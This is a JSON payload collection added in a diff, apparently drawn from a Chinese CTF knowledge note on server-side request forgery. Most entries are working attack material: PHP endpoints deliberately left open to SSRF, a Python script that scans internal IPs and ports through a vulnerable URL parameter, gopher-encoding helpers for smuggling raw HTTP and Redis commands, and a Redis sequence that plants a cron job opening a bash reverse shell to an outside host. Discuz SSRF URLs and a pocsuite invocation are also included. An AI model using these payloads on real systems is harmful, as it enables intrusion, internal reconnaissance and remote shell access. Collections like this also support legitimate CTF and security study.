@@ -1,0 +1,98 @@
+{
+  "id": "payload-ssrf-001",
+  "type": "payload",
+  "category": "ssrf_xxe",
+  "subcategory": "ssrf",
+  "name": "SSRF漏洞 Payload 集合",
+  "description": "从 SSRF漏洞.md 提取的实战 Payload",
+  "payloads": [
+    {
+      "payload": "URI = schema:[//authority]path[?query][#fragment]",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "$url = $_GET['url'];\r\n$ch = curl_init();\r\ncurl_setopt($ch, CURLOPT_URL, $url);\r\ncurl_setopt($ch, CURLOPT_HEADER, false);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\r\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\r\n$res = curl_exec($ch);\r\nheader(\"content-type: image/png\");\r\ncurl_close($ch);\r\necho $res;",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "# encoding = utf-8\r\nimport requests as req\r\nimport time\r\nports = ['80','3306','6379','8080','8000']\r\nsession = req.Session()\r\nfor i in xrange(255):\r\n\tip = '192.168.78.{}'.format(i)\r\n\tfor port in ports:\r\n\t\turl = \"http://example.com/?url=http://{}.{}\".format(ip,port)\r\n\t\ttry:\r\n\t\t\tres = session.get(url,timeout=3)\r\n\t\t\tif len(res.content) > 0:\r\n\t\t\t\tprint(ip,port,'is open')\r\n\t\texcept:\r\n\t\t\tcontinue\r\nprint(\"DONE\")",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "<?php\r\n$ip = '127.0.0.1';\r\n$ip = explode('.',$ip);\r\n$r = ($ip[0] << 24) | ($ip[1] << 16) | ($ip[2] << 8) | $ip[3] ;\r\nif($r < 0) {\r\n    $r += 4294967296;\r\n}\r\necho \"十进制:\";\r\necho $r;\r\necho \"八进制:\";\r\necho decoct($r);\r\necho \"十六进制:\";\r\necho dechex($r);\r\n?>",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "十进制:2130706433八进制:17700000001十六进制:7f000001",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "import urllib.parse\r\n   f = open(r'ssrf.txt','rb')\r\n   s = f.read()\r\n   s = urllib.parse.quote(s)\r\n   s = urllib.parse.quote(s)\r\n   print(\"gopher://127.0.0.1:1234/_\"+s)",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "<?php\r\necho \"Hello\".$_POST['a'];\r\n?>",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "import urllib\r\nimport requests\r\ntest =\\\r\n\"\"\"POST /1.php HTTP/1.1\r\nHost: 192.168.0.102\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 7\r\n\r\na=world\r\n\"\"\"\r\ntmp = urllib.parse.quote(test)\r\nnew = tmp.replace('%0A','%0D%0A')\r\nresult = '_'+new\r\nprint(result)",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "<?php\r\nfunction curl($url){\r\n  //创建一个新的curl资源\r\n  $ch = curl_init();\r\n  //设置URL和相应的选项\r\n  curl_setopt($ch,CURLOPT_URL,$url);\r\n  curl_setopt($ch,CURLOPT_HEADER,false);\r\n  //抓取URL并把它传递给浏览器\r\n  curl_exec($ch);\r\n  //关闭curl资源，并且释放系统资源\r\n  curl_close($ch);\r\n}\r\n$url = $_GET['url'];\r\ncurl($url);\r\n?>",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "$url = $_GET['url'];\r\necho file_get_contents($url);",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "echo -e \"\\n\\n\\n*/1 * * * * bash -i >& /dev/tcp/192.168.1.166/2345 0>&1\\n\\n\\n\"|redis-cli -h $1 -p $2 -x set 1\r\nredis-cli -h $1 -p $2 config set dir /var/spool/cron/\r\nredis-cli -h $1 -p $2 config set dbfilename root\r\nredis-cli -h $1 -p $2 save\r\nredis-cli -h $1 -p $2 quit",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "http://192.168.43.73:8082/Discuz/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://192.168.43.73/test.php?a.jpg[/img]",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "<?php                                                                         \r\n\theader(\"Location: gopher://192.168.43.73:2333/_test\");\r\n?>",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "http://127.0.0.1:8899/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://127.0.0.1:9999/1.php?a.jpg[/img]",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    },
+    {
+      "payload": "python2.7 pocsuite.py -r ../Discuz_SSRF_Redis.py -u http://192.168.1.166:8082/Discuz/forum.php --verify",
+      "context": "SSRF",
+      "source": "SSRF漏洞.md"
+    }
+  ],
+  "related_theory": [
+    "theory-ssrf-001"
+  ],
+  "related_pocs": [],
+  "tags": [
+    "SSRF",
+    "服务端请求伪造",
+    "内网探测",
+    "ssrf_xxe"
+  ],
+  "severity": "high",
+  "source": "Des-CTF-Knowledge/SSRF漏洞.md",
+  "last_updated": "2026-10-22"
+}
